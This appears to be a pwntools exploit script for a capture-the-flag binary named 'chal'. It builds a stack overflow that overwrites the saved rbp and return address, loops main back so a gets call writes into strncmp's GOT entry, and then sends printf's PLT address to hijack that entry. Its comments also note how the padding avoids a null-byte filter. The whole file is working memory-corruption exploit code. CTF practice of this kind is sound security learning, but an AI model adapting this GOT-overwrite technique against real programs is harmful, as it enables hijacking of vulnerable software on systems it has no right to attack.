from pwn import *
context.arch='amd64'; context.log_level='error'
e=ELF("./chal")
LOOP=0x40131c
GOT_STRNCMP=e.got['strncmp']   # 0x404018
PRINTF_PLT=e.plt['printf']     # 0x4010d4
BSS=0x404080  # after got, writable scratch

def build_overflow(rbp, rip):
    # 'exit' so main returns; pad to rbp slot (0x50), then rbp, then rip
    body=b"exit"+b"A"*(0x50-4)   # fills buf[0..0x50)
    body+=p64(rbp)               # saved rbp at 0x50
    body+=p64(rip)               # ret at 0x58
    assert b"\x00" not in body[:0x50], "null before rbp"
    # rbp value may contain nulls (trailing) -> first null triggers WAF at rbp's null.
    return body

# Test: set rbp = GOT_STRNCMP+0x50 so __gets writes to GOT_STRNCMP; RIP=LOOP.
p=process("./chal")
p.recvuntil(b">> ")
ov=build_overflow(GOT_STRNCMP+0x50, LOOP)
print("overflow first null at", ov.index(b"\x00") if b"\x00" in ov else -1, "len", len(ov))
p.send(ov)
# Now main should loop to 0x40131c: puts banner, printf '>> ', __gets(GOT_STRNCMP)
import time
time.sleep(0.3)
try:
    banner=p.recv(timeout=2)
    print("after overflow, recv:", banner[:120])
except Exception as ex:
    print("recv err", ex)
# send value to write into strncmp@got  (branch: *(GOT)[0]==0 initially? GOT has resolved strncmp addr, non-zero)
# so branch B reads strlen(GOT) bytes. Let's just send printf_plt and see.
p.send(p64(PRINTF_PLT))
time.sleep(0.3)
try:
    print("after write:", p.recv(timeout=2)[:200])
except Exception as ex:
    print("recv2 err", ex)
p.close()
